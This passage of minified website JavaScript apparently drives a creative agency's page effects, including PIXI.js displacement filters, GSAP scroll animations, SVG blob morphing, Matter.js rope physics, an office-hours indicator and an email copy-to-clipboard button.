n=this.maskSprite.worldTransform,s=Math.sqrt(n.a*n.a+n.b*n.b),o=Math.sqrt(n.c*n.c+n.d*n.d);0!==s&&0!==o&&(this.uniforms.rotation[0]=n.a/s,this.uniforms.rotation[1]=n.b/s,this.uniforms.rotation[2]=n.c/o,this.uniforms.rotation[3]=n.d/o),t.applyFilter(this,e,i,r)},Object.defineProperty(e.prototype,"map",{get:function(){return this.uniforms.mapSampler},set:function(t){this.uniforms.mapSampler=t},enumerable:!1,configurable:!0}),e}(hp);cc.add(Wp),cc.add(mc);const Am={DisplacementFilter:Sm};class Cm extends ru{constructor(t){super(),navigator.userAgent.indexOf("Speed Insights")>-1||navigator.userAgent.indexOf("Chrome-Lighthouse")>-1||(this.$wrapper=t,this.scroll=null,this.width=100,this.height=100,this.resolution=1,this.shapes=[],this.isVisible=!0,this.init())}initDOM(){this.$image=this.$wrapper.closest(".agency-intro").find(".agency-intro_media-wrapper")}initEl(){this.app=new mm({resizeTo:this.$wrapper[0],resolution:this.resolution,antialias:!1,backgroundAlpha:0,sharedTicker:!1,sharedLoader:!0}),this.$wrapper.append(this.app.view),this.pxShape=new Cf,this.app.stage.addChild(this.pxShape);const t=JSON.parse(this.$wrapper.attr("data-shapes-url"));let e=0;for(let i=0;i<t.length;i++){const r=new Cf,n=Dm.from(t[i]);n.texture.baseTexture.on("loaded",(()=>{e++,e===t.length&&this.resize()})),this.pxShape.addChild(r),r.addChild(n),n.anchor.set(.5),this.shapes.push({sprite:n,parent:r})}const i=Dm.from(this.$wrapper.attr("data-displacement-url"));i.texture.baseTexture.wrapMode=al.REPEAT,this.app.stage.addChildAt(i,0);const r=new Am.DisplacementFilter(i,50);r.padding=20,this.pxShape.filters=[r],this.tw.displacement=gsap.to(i,{duration:20,ease:"none",x:1024,y:512,repeat:-1}),this.shapes[0].start={x:0,y:.1},this.shapes[1].start={x:0,y:.3},this.shapes[2].start={x:0,y:0},this.shapes[0].end={x:1.2,y:.7},this.shapes[1].end={x:1.2,y:.8},this.shapes[2].end={x:1.2,y:1},this.shapes[0].duration=4,this.shapes[1].duration=3,this.shapes[2].duration=5,this.pxMask=new bg,this.app.stage.addChild(this.pxMask),this.resize(),this.tw.timeline=gsap.timeline({paused:!0,onComplete:()=>{this.tw.timeline.restart().pause()},scrollTrigger:{once:!1,trigger:this.$wrapper,start:"center bottom",toggleActions:"play none none none",onToggle:t=>{t.isActive?this.resume():this.pause()}}});for(let t=0;t<this.shapes.length;t++)this.tw.timeline.fromTo(this.shapes[t].sprite,{x:(e,i,r)=>this.shapes[t].start.x*this.width-this.shapes[t].sprite.width/2,y:(e,i,r)=>this.shapes[t].start.y*this.height-this.shapes[t].sprite.height/2},{x:(e,i,r)=>this.shapes[t].end.x*this.width+this.shapes[t].sprite.width/2,y:(e,i,r)=>this.shapes[t].end.y*this.height+this.shapes[t].sprite.height/2,duration:this.shapes[t].duration,ease:"power1.out"},t/3);this.shapes[1].parent.mask=this.pxMask}bindEvents(){eu.on(eu.E.RESIZE,this.resize,this)}unbindEvents(){eu.off(eu.E.RESIZE,this.resize,this),super.unbindEvents()}resize(t){if(!t){this.width=this.$wrapper.width(),this.height=this.$wrapper.height();for(let t=0;t<this.shapes.length;t++)this.shapes[t].sprite.rotation=Math.atan2(this.shapes[t].end.y*this.height+this.shapes[t].sprite.height/2-(this.shapes[t].start.y*this.height-this.shapes[t].sprite.height/2),this.shapes[t].end.x*this.width+this.shapes[t].sprite.width/2-(this.shapes[t].start.x*this.width-this.shapes[t].sprite.width/2));if(this.tw.timeline){const t=this.tw.timeline.getChildren();for(let e=0;e<t.length;e++)t[e].invalidate().restart();this.tw.timeline.invalidate().restart().pause(),this.tw.timeline.scrollTrigger.refresh()}this.updateMaskSize()}}updateMaskSize(){this.imageBBox=this.$image[0].getBoundingClientRect(),this.maskTop=this.$image.offset().top-this.$wrapper.offset().top,this.maskDiff=this.maskTop<0?-this.maskTop:0,this.maskTop=Math.max(0,this.maskTop),this.updateMask()}updateMask(){this.pxMask.clear(),this.pxMask.beginFill(16777215),this.pxMask.drawRect(0,0,this.width,this.height),this.pxMask.endFill(),this.pxMask.beginHole(),this.pxMask.drawRect(this.imageBBox.x,this.maskTop,this.imageBBox.width,this.imageBBox.height-this.maskDiff),this.pxMask.endHole()}pause(){this.tw.displacement.play(),this.app.stop()}resume(){this.tw.displacement.pause(),this.app.start()}destroy(){super.destroy()}}class Im extends ru{constructor(t){super(),this.$wrapper=t,this.init()}initDOM(){this.$images=this.$wrapper.find(".agence-clients_image-wrapper")}initEl(){this.tw.stshow=ScrollTrigger.create({trigger:this.$wrapper,start:"top 80%",onEnter:()=>this.animateFromTop()}),this.tw.sthide=ScrollTrigger.create({trigger:this.$wrapper,start:"top bottom",onLeaveBack:()=>this.hideElements()}),this.hideElements()}animateFromTop(){gsap.fromTo(this.$images,{autoAlpha:0,y:50},{duration:.5,autoAlpha:1,y:0,stagger:.03,immediateRender:!0})}hideElements(){gsap.set(this.$images,{autoAlpha:0})}}const Rm=new class{constructor(){bu.addPage("agency",Iu),ou.register("agency_header",_m),ou.register("agency_intro_shapes",Cm),ou.register("agency_awards",ym),ou.register("transition_awards",xm),ou.register("transition_clients",Im)}};class Pm extends yu{constructor(){super()}}class Om extends vm{constructor(t){super(t),MorphSVGPlugin.defaultUpdateTarget=!1,MorphSVGPlugin.defaultRender=null,this.numBlobs=6,this.shapeWidth=1500,this.shapeHeight=950,this.blobDuration=10,this.scale=this.realHeight/this.shapeHeight,this.init()}initDOM(){this.$content=this.$wrapper.closest(".page_container").find(".page_content"),this.$faceLeft=$("#face_left"),this.$faceRight=$("#face_right"),this.$blobLeft=$("#blob_left"),this.$blobRight=$("#blob_right"),this.$leftBlob=$("#left_blob"),this.$leftStart=$("#left_start"),this.$leftEnd=$("#left_end"),this.$rightBlob=$("#right_blob"),this.$rightStart=$("#right_start"),this.$rightEnd=$("#right_end")}initEl(){super.initEl(),this.$faceLeft.attr("d",this.$leftStart.attr("d")),this.$faceRight.attr("d",this.$rightStart.attr("d")),this.$blobLeft.attr("d",this.$leftStart.attr("d")),this.$blobRight.attr("d",this.$rightStart.attr("d")),this.pxBlobs=new Cf,this.pxBlobsGraphics={left:[],right:[]};for(let t=0;t<this.numBlobs;t++){const t=new bg;this.pxBlobs.addChildAt(t,0),this.pxBlobsGraphics.left.push(t);const e=new bg;this.pxBlobs.addChildAt(e,0),this.pxBlobsGraphics.right.push(e)}this.pxShape.addChild(this.pxBlobs),this.pxFaces=new Cf,this.pxFacesGraphics={left:new bg,right:new bg},this.pxFaces.addChild(this.pxFacesGraphics.left),this.pxFaces.addChild(this.pxFacesGraphics.right),this.app.stage.addChild(this.pxFaces)}bindEvents(){super.bindEvents()}raf(){super.raf(),this.isVisible&&(this.scrollPercent=Ru.easeOutQuint(Math.min(pu.yI/this.virtualHeight*1.25,1)),this.tw.faceleft.progress(this.scrollPercent),this.tw.faceright.progress(this.scrollPercent))}resize(t){t||(this.realHeight=this.$wrapper.height(),this.virtualHeight=this.$content.height(),this.scale=this.realHeight/this.shapeHeight,this.updateShapes())}checkScroll(){}updateShapes(){this.updateBlob("left"),this.updateBlob("right"),this.updateFace("left"),this.updateFace("right")}updateBlob(t){const e="left"===t?this.$blobLeft:this.$blobRight;for(let i=0;i<this.numBlobs;i++)this.tw["blob"+t+"-"+i]&&this.tw["blob"+t+"-"+i].progress(0,!0).kill(),this.pxBlobsGraphics[t][i].clear(),this.pxBlobs.setChildIndex(this.pxBlobsGraphics[t][i],2*(this.numBlobs-i)-("left"===t?1:2)),this.tw["blob"+t+"-"+i]=gsap.to(e,{duration:this.blobDuration,ease:"none",repeat:-1,morphSVG:{shapeIndex:"left"===t?-15:22,shape:"left"===t?this.$leftBlob:this.$rightBlob,render:e=>{this.drawBlob(this.tw["blob"+t+"-"+i].progress(),t,this.pxBlobsGraphics[t][i],e)}},onRepeat:()=>{this.pxBlobs.setChildIndex(this.pxBlobsGraphics[t][i],2*this.numBlobs-("left"===t?1:2))}}),this.tw["blob"+t+"-"+i].progress(i/this.numBlobs,!0)}updateFace(t){const e="left"===t?this.$faceLeft:this.$faceRight;this.tw["face"+t]&&this.tw["face"+t].progress(0,!0).kill(),this.pxFacesGraphics[t].clear(),this.tw["face"+t]=gsap.to(e,{paused:!0,ease:"none",morphSVG:{shape:"left"===t?this.$leftEnd:this.$rightEnd,render:e=>{this.drawFace(t,this.pxFacesGraphics[t],e)}}})}drawBlob(t,e,i,r){i.clear();const n=1-t,s=this.scale+t,o=this.shapeWidth*s,a=this.shapeHeight*s,h=32+11*Ru.easeInQuad(n*this.introAlpha),u=32+194*Ru.easeInQuad(n*this.introAlpha);let l;i.beginFill(Vl([h/255,h/255,u/255])),i.x="left"===e?eu.wW/2-o+o/23*this.scrollPercent-eu.wW/10*(1-this.scrollPercent)+t*(eu.wW/3):eu.wW/2-o/23*this.scrollPercent+eu.wW/10*(1-this.scrollPercent)-t*(eu.wW/3),i.y=this.realHeight/2-a/2-this.realHeight/2*this.scrollPercent*t,i.scale.set(s,s);for(let t=0;t<r.length;t++){l=r[t],i.moveTo(l[0],l[1]);for(let t=2;t<l.length;t+=6)i.bezierCurveTo(l[t],l[t+1],l[t+2],l[t+3],l[t+4],l[t+5]);l.closed&&i.closePath()}i.endFill()}drawFace(t,e,i){let r,n,s,o;e.clear();const a=this.shapeWidth*this.scale,h=this.shapeHeight*this.scale;if("left"===t){const t=32+11*Ru.easeInQuad(this.introAlpha),i=32+194*Ru.easeInQuad(this.introAlpha);e.beginFill(Vl([t/255,t/255,i/255])),e.x=eu.wW/2-a/2-a/2+a/23*this.scrollPercent-eu.wW/10*(1-this.scrollPercent),e.y=this.realHeight/2-h/2}else{const t=32+28*Ru.easeInQuad(this.introAlpha),i=32+11*Ru.easeInQuad(this.introAlpha),r=32+194*Ru.easeInQuad(this.introAlpha);e.beginFill(Vl([t/255,i/255,r/255])),e.x=eu.wW/2-a/23*this.scrollPercent+eu.wW/10*(1-this.scrollPercent),e.y=this.realHeight/2-h/2}for(e.scale.set(this.scale,this.scale),s=0;s<i.length;s++){for(n=i[s],r=n.length,e.moveTo(n[0],n[1]),o=2;o<r;o+=6)e.bezierCurveTo(n[o],n[o+1],n[o+2],n[o+3],n[o+4],n[o+5]);n.closed&&e.closePath()}e.endFill()}killShape(t){t.graphics.clear(),t.graphics.destroy(),t.completionTween.kill(),t.points=null,this.shapes.splice(this.shapes.indexOf(t),1)}}class Nm extends ru{constructor(t){super(),this.$wrapper=t,this.init()}init(){const t=new Date,e=[{open:"09:00",close:"12:30"},{open:"14:00",close:"17:30"}],i=this.$wrapper.attr("data-open"),r=this.$wrapper.attr("data-close"),n=t.getUTCDay(),s=60*(t.getUTCHours()+2)+t.getUTCMinutes(),o={fr:["dimanche","lundi","mardi","mercredi","jeudi","vendredi","samedi"],en:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"]};let a=!1;if(0!==n&&6!==n)for(let t in e){const i=e[t],r=i.open.split(":"),n=60*parseInt(r[0])+parseInt(r[1]),o=i.close.split(":"),h=60*parseInt(o[0])+parseInt(o[1]);s>n&&s<h&&(a=!0)}if(a)return void(this.$wrapper[0].innerHTML='<span class="open">'+i+"</span>");let h=0,u=0,l=o[gu.CURRENT_LANG][n],c=(n+1)%6;if(0===n||6===n)u=0,c=1,l=o[gu.CURRENT_LANG][c];else{const t=e[0].open.split(":"),i=60*parseInt(t[0])+parseInt(t[1]),r=e[1].open.split(":"),a=60*parseInt(r[0])+parseInt(r[1]),d=e[0].close.split(":"),p=60*parseInt(d[0])+parseInt(d[1]),f=e[1].close.split(":"),g=60*parseInt(f[0])+parseInt(f[1]);if(s<i?h=0:s>p&&s<a?h=1:s>g&&(h=2),u=0===h||2===h?0:1,2===h){for(c=(n+1)%6;0===c||6===c;)c++;l=o[gu.CURRENT_LANG][c]}}"fr"===gu.CURRENT_LANG?this.$wrapper[0].innerHTML='<span class="close">'+r.replace("%h",e[u].open.replace(":","h")).replace("%d",l)+"</span>":this.$wrapper[0].innerHTML='<span class="close">'+r.replace("%h",e[u].open).replace("%d",l)+"</span>"}}class Mm extends ru{constructor(t,e){super(),this.$wrapper=t,this.$email=this.$wrapper,this.useText=e,this.init()}initDOM(){this.useText&&(this.$copyWrapper=this.$wrapper.find(".email-copy_copy_wrapper"),this.$copyText=this.$wrapper.find(".email-copy_copy--text_copy"),this.$copiedText=this.$wrapper.find(".email-copy_copy--text_copied"),this.$copySvg=this.$copyWrapper.find("svg"),this.transitionDelay=getComputedStyle(document.documentElement).getPropertyValue("--transition-delay"))}initEl(){this.useText&&this._initAnimation()}bindEvents(){this.eh.clickEmail=this._clickEmail.bind(this),this.$email.on("click",this.eh.clickEmail),this.eh.clickCopy=this._copyToClipboard.bind(this),this.$email.on("click",this.eh.clickCopy),this.eh.unHoverEmail=this._unHoverEmail.bind(this),this.$email.on("mouseleave",this.eh.unHoverEmail)}unbindEvents(){this.$email.off("click",this.eh.clickEmail),this.$email.off("click",this.eh.clickCopy),this.$email.off("mouseleave",this.eh.unHoverEmail)}_clickEmail(){this.useText&&document.documentElement.style.setProperty("--transition-delay","0s"),Jh.IS_TOUCH||this.tw.delayed&&this.tw.delayed.isActive()||(this.$wrapper.addClass("copied"),this.useText&&this.tl.copyText.play(),this._delayedCall(2.4))}_copyToClipboard(t){Jh.IS_TOUCH||(t.preventDefault(),t.currentTarget&&t.currentTarget.hasAttribute("data-text")&&navigator.clipboard.writeText(t.currentTarget.getAttribute("data-text").trim()))}_initAnimation(){this.tl.copyText=gsap.timeline({paused:!0}).to(this.$copyText,{y:"-50%",opacity:0,duration:.2,ease:"power1.out"}).to(this.$copiedText,{y:0,opacity:1,color:"white",duration:.2,ease:"power1.out"},"<")}_unHoverEmail(){this.useText&&document.documentElement.style.setProperty("--transition-delay",this.transitionDelay),this._delayedCall(.2)}_delayedCall(t){this.tw.delayed=gsap.delayedCall(t,(()=>{this.$wrapper.removeClass("copied"),this.useText&&setTimeout((()=>{this.tl.copyText.reverse()}),100),this.tw.delayed.kill()}))}}class Fm extends ru{constructor(t,e){super(),this.$wrapper=$(t),this.contactEmails=e,this.init()}initDOM(){this.$email=this.$wrapper}initEl(){super.initEl(),this.emailCopy=new Mm(this.$wrapper,!0)}}class Lm extends ru{constructor(t){super(),this.$wrapper=t,this.init()}initDOM(){this.$emails=this.$wrapper.find(".email-copy_link")}initEl(){super.initEl(),Array.from(this.$emails).forEach((t=>{new Fm(t,this)}))}}const Bm=new class{constructor(){bu.addPage("contact",Pm),ou.register("contact_header",Om),ou.register("contact_emails",Lm),ou.register("schedules",Nm)}};class Um extends yu{constructor(){super()}}const km=new class{constructor(){bu.addPage("page",Um)}};class Gm extends yu{constructor(){super()}}class Hm extends vm{constructor(t){super(t),this.debug=!1,this.debug&&this.$wrapper.addClass("debug"),this.numShapes=30,this.maxForce=1e-7*eu.wW,this.defaultCategory=1,this.init()}initEl(){super.initEl(),this._initMatter()}_initMatter(){this.matterWidth=eu.wW,this.matterHeight=eu.wH,this.engine=b().Engine.create(),this.world=this.engine.world,this.debug&&(this.render=b().Render.create({element:this.$wrapper[0],engine:this.engine,options:{background:"transparent",wireframeBackground:"transparent",wireframes:!0,width:this.matterWidth,height:this.matterHeight,pixelRatio:1,enabled:!0}}),b().Render.run(this.render))}bindEvents(){this.onBeforeUpdateHandler=this.onBeforeUpdate.bind(this),b().Events.on(this.engine,"beforeUpdate",this.onBeforeUpdateHandler),super.bindEvents()}unbindEvents(){b().Events.off(this.engine,"beforeUpdate",this.onBeforeUpdateHandler),super.unbindEvents()}resize(t){if(!t){this.debug&&(this.render.canvas.width=this.render.canvas.offsetWidth,this.render.canvas.height=this.render.canvas.offsetHeight),this.numShapes=tu.clamp(Math.round(.03*eu.wW),20,50),this.numShapes=100,this.maxForce=1e-7*eu.wW,this.killShapes(t);for(let t=0;t<this.numShapes;t++)this.addShape(t);super.resize()}}raf(){super.raf(),this.isVisible&&(b().Engine.update(this.engine,1e3/60),this.drawShapes())}onBeforeUpdate(){for(let t=0;t<this.shapes.length;t++){const e=b().Vector.create(b().Common.random(-this.maxForce,this.maxForce),0);for(let i=0;i<this.shapes[t].rope.bodies.length;i++){const r=this.shapes[t].rope.bodies[i];b().Body.applyForce(r,{x:r.position.x+eu.wW,y:r.position.y},e)}}}addShape(t){b().Body.nextGroup();let e={},i=(this.numShapes,Math.random()*eu.wW),r=Math.max(1,.01*Math.min(eu.wH,eu.wW)),n=Math.random()*(1.25*r)+.75*r+.25*r;const s=b().Composites.stack(i,-100,1,4,0,eu.wH/5,((t,e,i,r,s,o)=>b().Bodies.circle(t,e,n,{collisionFilter:{mask:0}},10)));b().Composites.chain(s,0,.5,0,-.5,{stiffness:1,length:eu.wH/5,render:{type:"line"}});const o=(s.bodies[0].bounds.max.y-s.bodies[0].bounds.min.y)/2;b().Composite.add(s,b().Constraint.create({pointA:{x:s.bodies[0].position.x,y:s.bodies[0].position.y-o},bodyB:s.bodies[0],pointB:{x:0,y:-o},length:10,stiffness:1})),b().Composite.add(this.world,[s]),e.completion=1-this.shapes.length/this.numShapes,e.rope=s,e.graphics=new bg,this.pxShape.addChild(e.graphics),this.shapes.push(e)}killShape(t){b().Composite.remove(this.world,t.rope),t.graphics.clear(),t.graphics.destroy(),t.rope=null,t.graphics=null,t.completion=null,this.shapes.splice(this.shapes.indexOf(t),1),t=null}drawShapes(){for(let t=0;t<this.shapes.length;t++){const e=this.shapes[t],i=e.completion,r=e.rope.bodies.length,n=[],s=(e.rope.bodies[0].bounds.max.x-e.rope.bodies[0].bounds.min.x)*(1+this.scrollPercent*(1-i));for(let t=0;t<r;t++){const i=e.rope.bodies[t];n.push({x:i.position.x*this.shapesResolution,y:i.position.y*this.shapesResolution})}e.graphics.clear(),e.graphics.lineStyle({width:s*this.shapesResolution,color:16777215,alpha:1,alignment:.5,native:!1,cap:Af.SQUARE,join:Sf.MITER}),e.graphics.moveTo(n[0].x,n[0].y),fu.curveThroughPoints(n,e.graphics),e.graphics.endFill();const o=Ru.easeInQuint(1-i)*this.scrollPercent;e.graphics.pivot.set(eu.wW*this.shapesResolution,0),e.graphics.position.set(eu.wW,-this.virtualHeight*o),e.graphics.scale.set(1/this.shapesResolution,1/this.shapesResolution);const a=32+11*tu.clamp(Ru.linear(1-i)*this.introAlpha*(1-this.scrollPercent),0,1),h=Vl([a/255,a/255,(32+194*tu.clamp(Ru.linear(1-i)*this.introAlpha*(1-this.scrollPercent),0,1))/255]);e.graphics.tint=h}}destroy(){b().World.clear(this.engine.world),b().Engine.clear(this.engine),super.destroy()}}class zm extends ru{constructor(t){super(),this.$wrapper=t,this.init()}initDOM(){this.$video=this.$wrapper.find(".project_card-thumbnail video")}bindEvents(){this.tw.st=ScrollTrigger.create({trigger:this.$wrapper,start:"top center",end:"bottom center",onToggle:t=>{t.isActive?this.$video[0].play():this.$video[0].pause()}})}}class Vm extends ru{constructor(t){super(),this.$wrapper=t,this.scrollLimits=[],this.prevLimit=-1,this.currentIndex=!1,this.margin=300,this.max=eu.wH,this.visible=!1,this.init()}init(){super.init(),this.resize()}initDOM(){this.$content=du.$pageWrap.find(".page_content-inner"),this.$links=this.$wrapper.find(".project_toc-link")}bindEvents(){this.eh.linkClickHandler=this._linkClick.bind(this),this.$links.on("click",this.eh.linkClickHandler),du.on(du.E.RAF,this.raf,this),eu.on(eu.E.RESIZE,this.resize,this),su.once(su.E.TRANSITION_COMPLETE,this.resize,this)}unbindEvents(){this.$links.off("click",this.eh.linkClickHandler),du.off(du.E.RAF,this.raf,this),eu.off(eu.E.RESIZE,this.resize,this),super.unbindEvents()}_linkClick(t){t.preventDefault();const e=document.querySelector(t.currentTarget.getAttribute("href"));pu.scrollTo(e,"smooth")}raf(){if(!0===this.visible&&pu.yI>this.max?(this.visible=!1,this.$wrapper.addClass("hidden"),this.$links.removeClass("active"),this.currentIndex=-1):!1===this.visible&&pu.yI<=this.max&&(this.visible=!0,this.$wrapper.removeClass("hidden")),!this.visible)return;const t=pu.yI+this.margin;if(t===this.prevLimit)return;this.prevLimit=t;let e=!1;for(let i=0;i<this.scrollLimits.length;i++)this.scrollLimits[i]<t&&(e=i);this.currentIndex!==e&&(this.currentIndex=e,this.reset(),!1!==e)&&this.$links.eq(this.currentIndex).addClass("active")}reset(){this.prevLimit=-1,this.visible=!0,this.$links.removeClass("active"),this.$links.removeClass("hidden")}resize(){this.max=this.$content.outerHeight()-1.3*eu.wH,this.margin=.5*eu.wH,this.scrollLimits=[],this.$links.each(((t,e)=>{const i=e.getAttribute("href");if(""===i||"#"===i)return;const r=document.querySelector(i);let n;r&&(n=r.getBoundingClientRect(),this.scrollLimits.push(n.top+pu.y))})),this.reset()}}class Xm extends ru{constructor(t){super(),this.linesClass="transition-line",this.$wrapper=t,this.split=null,this.type=this.$wrapper[0].hasAttribute("data-transition-lines")?this.$wrapper[0].getAttribute("data-transition-lines"):"children",this.$targets="children"===this.type?this.$wrapper[0].children:this.$wrapper[0],this.init()}initEl(){this.split=new SplitText(this.$targets,{type:"lines",linesClass:this.linesClass}),this.tw.stshow=ScrollTrigger.create({trigger:this.$wrapper,start:"top 90%",onEnter:()=>this.animateFromTop()}),this.tw.sthide=ScrollTrigger.create({trigger:this.$wrapper,start:"top bottom",onLeaveBack:()=>this.hideElements()}),this.hideElements()}animateFromTop(){gsap.fromTo(this.split.lines,{autoAlpha:0,y:50},{autoAlpha:1,y:0,duration:.3,stagger:.1,immediateRender:!0})}hideElements(){gsap.set(this.split.lines,{autoAlpha:0})}update(){this.split.split(),this.hideElements()}bindEvents(){eu.on(eu.E.RESIZE,this.resize,this),super.bindEvents()}unbindEvents(){eu.off(eu.E.RESIZE,this.resize,this),super.bindEvents()}resize(t){t||this.update()}destroy(){this.split=null,super.destroy()}}class jm extends Xm{constructor(t){super(t)}init(){this.$wrapper.closest("a").addClass("transition-link"),this.linesClass="transition-line transition-link-line",super.init()}update(){super.update(),$(this.split.lines).each(((t,e)=>{e.setAttribute("data-text",e.textContent)}))}}const $m=new class{constructor(){bu.addPage("projects",Gm),ou.register("projects_header",Hm),ou.register("project_card_thumbnail",zm),ou.register("toc",Vm),ou.register("transition_project_card_title",jm)}};class Wm extends yu{constructor(){super()}}class Ym extends vm{constructor(t){super(t),this.center={x:eu.wW/4,y:eu.wH/6},this.duration=15,this.numShapes=15,this.pxShape=null,this.init()}initEl(){super.initEl();for(let t=0;t<this.numShapes;t++)this.addShape(1-1/this.numShapes-t/this.numShapes)}raf(){super.raf(),this.isVisible&&this.drawShapes()}pause(){for(let t=0;t<this.shapes.length;t++)this.shapes[t].pointsTween.map((t=>t.pause())),this.shapes[t].completionTween.pause();super.pause()}resume(){for(let t=0;t<this.shapes.length;t++)this.shapes[t].pointsTween.map((t=>t.resume())),this.shapes[t].completionTween.resume();super.resume()}resize(t){t||(this.center={x:eu.wW/4,y:eu.wH/6},super.resize(t))}addShape(t){let e,i={},r=Math.round(8*Math.random()+4),n=[],s=[];i.completion=t;for(let e=0;e<r;e++){let i={x:Math.random()/r+e/r,y:Math.random(),radius:Math.random(),angle:e/r+(Math.random()-.5)/10};n.push(i);let o=gsap.timeline(),a=Math.round(4*Math.random()+4);for(let t=0;t<a;t++)o.to(i,{duration:this.duration/a,ease:"power1.inOut",angle:e/r+(Math.random()-.5)/10,radius:Math.random()});o.progress(t),s.push(o)}e=gsap.to(i,{duration:this.duration,completion:1,ease:"none",onComplete:()=>{this.killShape(i),this.addShape(0)}}),e.progress(t),i.points=n,i.graphics=new bg,i.pointsTween=s,i.completionTween=e,this.pxShape.addChild(i.graphics),this.shapes.push(i)}drawShapes(){for(let t=0;t<this.shapes.length;t++){const e=this.shapes[t],i=[],r=e.completion,n=r/2*(2*this.scrollPercent+1)/this.shapesResolution;let s,o;for(let t=0;t<e.points.length;t++){const r=e.points[t],n=1+r.radius,s=Math.hypot(eu.wW,eu.wH)*this.shapesResolution*n,o=360*r.angle*this.DEG_TO_RAD;i.push(fu.getPointOnCircle(this.center.x,this.center.y,s,o))}const a=Ru.easeOutQuart(r)*this.scrollPercent,h=-this.virtualHeight*a,u=32+11*tu.clamp(Ru.easeInQuad(1-r)*this.introAlpha*(1-this.scrollPercent),0,1),l=Vl([u/255,u/255,(32+194*tu.clamp(Ru.easeInQuad(1-r)*this.introAlpha*(1-this.scrollPercent),0,1))/255]);e.graphics.clear(),e.graphics.beginFill(16777215),e.graphics.moveTo(i[0].x,i[0].y),s=(i[0].x+i[1].x)/2,o=(i[0].y+i[1].y)/2,e.graphics.moveTo(s,o);for(let t=1;t<i.length+1;t++){let r=t%i.length,n=(r+1)%i.length;s=(i[r].x+i[n].x)/2,o=(i[r].y+i[n].y)/2,e.graphics.quadraticCurveTo(i[r].x,i[r].y,s,o)}e.graphics.endFill(),e.graphics.pivot.set(this.center.x,this.center.y),e.graphics.position.set(this.center.x,this.center.y+h),e.graphics.scale.set(n,n),e.graphics.tint=l}}killShape(t){for(let e=0;e<t.points.length;e++)t.points[e].radiusTw=null,t.points[e].angleTw=null;for(let e=0;e<t.pointsTween.length;e++)t.pointsTween[e].kill();t.pointsTween=null,t.graphics.clear(),t.graphics.destroy(),t.completionTween.kill(),t.points=null,this.shapes.splice(this.shapes.indexOf(t),1),t=null}}class qm extends ru{constructor(t){super(),this.$wrapper=t,this.velocity=0}initEl(){this.$canvas=$(document.createElement("canvas")),this.$wrapper.append(this.$canvas),this.ctx=this.$canvas[0].getContext("2d"),this.tw.scroll=ScrollTrigger.create({trigger:this.$wrapper[0],onToggle:t=>{t.isActive?this.resume():this.pause()},onUpdate:t=>{this.velocity=t.getVelocity()}})}bindEvents(){eu.on(eu.E.RESIZE,this.resize,this)}unbindEvents(){eu.off(eu.E.RESIZE,this.resize,this),this.isVisible&&du.off(du.E.RAF,this.raf,this),super.unbindEvents()}resize(){this.size=this.$wrapper.width(),this.$canvas[0].style.width=this.size+"px",this.$canvas[0].style.height=this.size+"px",this.$canvas[0].width=this.size,this.$canvas[0].height=this.size}raf(){this.isVisible&&this.updateCanvas()}updateCanvas(){}pause(){this.isVisible=!1,du.off(du.E.RAF,this.raf,this)}resume(){this.isVisible=!0,du.on(du.E.RAF,this.raf,this)}}class Zm extends qm{constructor(t){super(t),this.rotation1=2,this.rotation2=-2,this.init()}updateCanvas(){const t=this.velocity>=0?tu.clamp(3e-4*this.velocity,.01,.05):tu.clamp(3e-4*this.velocity,-.05,-.01);let e,i;this.rotation1-=t,this.rotation2+=t,this.ctx.resetTransform(),this.ctx.moveTo(0,0),this.ctx.clearRect(0,0,this.size,this.size),this.ctx.fillStyle="#4545FF",this.ctx.globalAlpha=.5,this.ctx.globalCompositeOperation="source-over",e=.1*this.size*Math.sin(this.rotation1),i=.1*this.size*Math.cos(this.rotation1),this.ctx.translate(.6*this.size,.4*this.size),this.ctx.beginPath(),this.ctx.arc(e,i,.3*this.size,0,2*Math.PI),this.ctx.fill(),e=.1*this.size*Math.cos(this.rotation2),i=.1*this.size*Math.sin(this.rotation2),this.ctx.resetTransform(),this.ctx.translate(.4*this.size,.6*this.size),this.ctx.beginPath(),this.ctx.arc(e,i,.3*this.size,0,2*Math.PI),this.ctx.fill()}}class Km extends qm{constructor(t){super(t),this.rotation1=2,this.rotation2=-2,this.init()}updateCanvas(){const t=this.velocity>=0?tu.clamp(3e-4*this.velocity,.01,.1):tu.clamp(3e-4*this.velocity,-.1,-.01);this.rotation1-=t,this.rotation2+=t,this.ctx.setTransform(1,0,0,1,0,0),this.ctx.clearRect(0,0,this.size,this.size),this.ctx.fillStyle="#4545FF",this.ctx.globalAlpha=.5,this.ctx.globalCompositeOperation="source-over",this.ctx.translate(.61*this.size,.45*this.size),this.ctx.rotate(.1*this.rotation1),this.ctx.beginPath(),this.ctx.rect(.27*-this.size,.27*-this.size,.54*this.size,.54*this.size),this.ctx.fill();const e=.1*this.size*Math.sin(.5*this.rotation1),i=.1*this.size*Math.cos(.5*this.rotation1);this.ctx.resetTransform(),this.ctx.translate(.413*this.size,.53*this.size),this.ctx.beginPath(),this.ctx.arc(e,i,.313*this.size,0,2*Math.PI),this.ctx.fill();const r=.5*this.size,n=r*(Math.sqrt(3)/2);this.ctx.globalAlpha=1,this.ctx.resetTransform(),this.ctx.translate(.6*this.size,.65*this.size),this.ctx.rotate(.1*this.rotation2),this.ctx.beginPath(),this.ctx.moveTo(0,-n/2),this.ctx.lineTo(-r/2,n/2),this.ctx.lineTo(r/2,n/2),this.ctx.lineTo(0,-n/2),this.ctx.fill()}}class Qm extends qm{constructor(t){super(t),this.rotation1=2,this.rotation2=-2,this.init()}updateCanvas(){const t=this.velocity>=0?tu.clamp(3e-4*this.velocity,.01,.1):tu.clamp(3e-4*this.velocity,-.1,-.01);this.rotation1-=t,this.rotation2+=t;const e=[.5,.3,.1];this.ctx.resetTransform(),this.ctx.clearRect(0,0,this.size,this.size),this.ctx.fillStyle="#4545FF",this.ctx.globalAlpha=.5,this.ctx.globalCompositeOperation="source-over";for(let t=0;t<3;t++){const i=this.size*e[t],r=.3*(t%2==0?this.rotation2*(1-e[t]):this.rotation1*(1-e[t]));this.ctx.resetTransform(),this.ctx.translate(.5*this.size,.5*this.size),this.ctx.rotate(r),this.ctx.beginPath(),this.ctx.moveTo(i*Math.cos(0),i*Math.sin(0));for(let t=1;t<=6;t++)this.ctx.lineTo(i*Math.cos(2*t*Math.PI/6),i*Math.sin(2*t*Math.PI/6));this.ctx.fill()}}}class Jm extends 